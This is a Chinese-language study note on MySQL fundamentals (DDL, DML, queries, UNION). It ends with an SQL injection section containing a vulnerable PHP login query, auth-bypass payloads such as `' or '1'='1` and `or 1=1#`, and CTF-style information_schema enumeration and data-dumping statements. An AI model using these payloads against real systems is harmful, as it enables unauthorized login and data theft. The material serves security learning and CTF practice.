# 1. 数据库核心概念

## 1.1 什么是数据库
数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。

**数据库层级结构（类比学校）**

| 层级 | 类比 | 示例 |
| --- | --- | --- |
| 顶层：数据库 | 整个学校 | school 库（存储校园所有数据） |
| 中层：数据表 | 学校不同部门 | users 表、classes 表 |
| 底层：字段+数据 | 表头+行内容 | 字段：id、name，数据：2025001、张三 |

## 1.2 数据库管理系统（DBMS）
数据库的"管家"，负责管理数据访问、存储规则，常见类型：

1. Oracle：功能强、收费，银行/电信常用
2. SQL Server：适配Windows，政府单位常用
3. MySQL：开源免费、轻巧，校园系统/网站主流

# 2. 数据库连接操作

## 2.1 Navicat 可视化连接
1. 打开 Navicat → 左上角「连接」→ 选择「MySQL」
2. 填写核心信息：
   - 主机：`localhost`（本地数据库）
   - 端口：`3306`（MySQL 默认端口）
   - 用户名：`root`（超级管理员）
   - 密码：安装 MySQL 时设置的密码
3. 点击「测试连接」，提示"连接成功"即完成
4. 双击连接名，即可查看/操作数据库

## 2.2 命令行连接
```sql
mysql -u root -p
```
- `-u`：指定用户名
- `-p`：需要输入密码（输入时不显示，属正常现象）
- 回车后输入密码，再次回车即可登录

# 4. DDL 库与表定义

## 4.1 数据库操作
```sql
SHOW DATABASES;                -- 查看所有库
USE 数据库名;                   -- 切换数据库
CREATE DATABASE 库名;           -- 创建库
DROP DATABASE 库名;             -- 删除库
```

### 4.1.1 创建 school 数据库（指定字符集）
```sql
CREATE DATABASE school CHARACTER SET utf8 COLLATE utf8_general_ci;
```
- `CHARACTER SET`：指定字符集
- `COLLATE`：指定排序规则

## 4.2 数据表操作
```sql
SHOW TABLES;                    -- 查看当前库所有表
DESC 表名;                      -- 查看表结构
CREATE TABLE 表名(字段 类型…);   -- 创建表
DROP TABLE 表名;                -- 删除表
```

### 4.2.1 创建 users 学生表
```sql
USE school;

CREATE TABLE users (
    id INT(11) PRIMARY KEY,            -- 主键，学号（唯一标识）
    name VARCHAR(50) NOT NULL,         -- 姓名，非空
    id_card VARCHAR(18) NOT NULL,      -- 身份证号
    phone VARCHAR(11) NOT NULL,        -- 手机号
    address TEXT,                       -- 地址
    password VARCHAR(255) NOT NULL     -- 密码
);
```

# 5. DML 数据操作（增删改查）

## 5.1 插入 INSERT
```sql
INSERT INTO `school`.`users` (`id`, `name`, `id_card`, `phone`, `address`, `password`)
VALUES (3, 'shiro', '123456789', '123456789', '中国', '123456');
```
- `INSERT INTO 表名(字段1, 字段2)`：指定新增数据的表和字段
- `VALUES(值1, 值2)`：批量填数据，顺序与字段对应

## 5.2 查询 SELECT
```sql
-- 查所有列
SELECT * FROM 表名;

-- 查指定列
SELECT 字段1, 字段2 FROM 表名;

-- 按条件查询
SELECT name, password FROM users WHERE id = 1;

-- 去重
SELECT DISTINCT 字段 FROM 表名;

-- 排序（ASC 升序默认 / DESC 降序）
SELECT name FROM users ORDER BY id;
SELECT name FROM users ORDER BY name DESC;

-- 分页（从 n 开始取 m 条）
SELECT * FROM users LIMIT 3;
SELECT * FROM users LIMIT 1, 2;
```

## 5.3 修改 UPDATE
```sql
UPDATE users SET password = 'newpass789' WHERE id = 2;
```
注意：**漏写 `WHERE` 会修改表中所有数据**。

## 5.4 删除 DELETE
```sql
DELETE FROM users WHERE id = 1;
```
同样，**漏写 `WHERE` 会清空整张表**，且难以恢复。

# 6. 常用条件语法

## 6.1 运算符
| 类型 | 语法 | 说明 |
| --- | --- | --- |
| 比较 | `=` `>` `<` `>=` `<=` `!=` | 值比较 |
| 逻辑 | `AND` `OR` `NOT` | 条件组合 |
| 范围 | `BETWEEN 小 AND 大` | 区间筛选 |
| 集合 | `IN(值1, 值2)` | 多值匹配 |

### 6.1.1 AND（并且）：多个条件必须同时满足
```sql
SELECT name, password FROM users WHERE id = 2 AND name = 'xiaolin';
```

### 6.1.2 OR（或者）：满足任一条件即可
```sql
SELECT * FROM users WHERE id = 2 OR id = 3;
```

## 6.2 模糊查询
```sql
LIKE '%字符%'  -- % 匹配任意多个字符
LIKE '_字符_'  -- _ 匹配单个字符

-- 示例
SELECT * FROM users WHERE name LIKE 'x%';   -- 查姓 x 的学生
```

# 9. 联合查询 UNION

将多个 SELECT 结果合并，前提：**字段数相同、字段类型兼容**。

```sql
SELECT 列1, 列2 FROM 表1
UNION
SELECT 列1, 列2 FROM 表2;

-- UNION：合并结果并去重
-- UNION ALL：保留重复数据
```

# 10. SQL 注入漏洞

## 10.1 万能密码

### 10.1.1 漏洞根源
```php
$sql = "SELECT * FROM users WHERE name='$name' AND password='$pwd'";
```
- 直接将用户输入拼接到 SQL 语句的单引号中执行
- 未检查/过滤特殊字符（如 `'`、`OR`、`#` 等），也未做转义处理
- 攻击者可输入恶意字符篡改 SQL 逻辑

### 10.1.2 攻击原理
攻击者输入 `123' or '1'='1`，实现 3 个关键操作：

1. 闭合原有 SQL 语句的单引号，打破查询限制
2. 添加 `'1'='1'` 恒成立条件，让查询条件永远为真
3. 注释多余内容，避免 SQL 语法错误

### 10.1.3 篡改后的 SQL 对比
原正常 SQL：
```sql
SELECT * FROM users WHERE name='admin' AND password='123'
```

篡改后 SQL：
```sql
SELECT * FROM users WHERE name='admin' AND password='123' or '1'='1'
```

无论账号密码是否正确，数据库都会返回所有用户信息，实现免密绕过。

```sql
SELECT * FROM users WHERE name='admin' or 1=1#' AND password='123'
```

## 10.2 CTF 注入常用语句

### 10.2.1 核心系统库：information_schema
MySQL 自带**系统字典库**，储存所有数据库名、表名、字段名，注入查表必备。

| 系统表 | 存储内容 |
| --- | --- |
| `schemata` | 所有数据库信息 |
| `tables` | 所有数据表信息 |
| `columns` | 所有字段（列）信息 |

| 关键字段 | 含义 |
| --- | --- |
| `schema_name` | 数据库名 |
| `table_schema` | 表所属的数据库 |
| `table_name` | 数据表名 |
| `column_name` | 字段（列）名 |

### 10.2.2 常用注入语句

1. 查看当前库、版本
```sql
SELECT DATABASE();
SELECT VERSION();
```

2. 查询所有数据库
```sql
SELECT schema_name FROM information_schema.schemata;
```

3. 查询当前库所有表
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
```

4. 查询指定表所有字段
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = '表名';
```

5. 探测字段数量
```sql
ORDER BY 1;
ORDER BY 2;
-- 不报错代表存在，报错即为最大列数
```

6. 批量拼接爆库/表/字段
```sql
-- 爆出当前库所有表
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database();

-- 爆出指定表所有字段
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '表名';
```

7. 查询表内真实数据
```sql
SELECT 字段1, 字段2 FROM 表名;
SELECT * FROM 表名 LIMIT 0, 1;
```
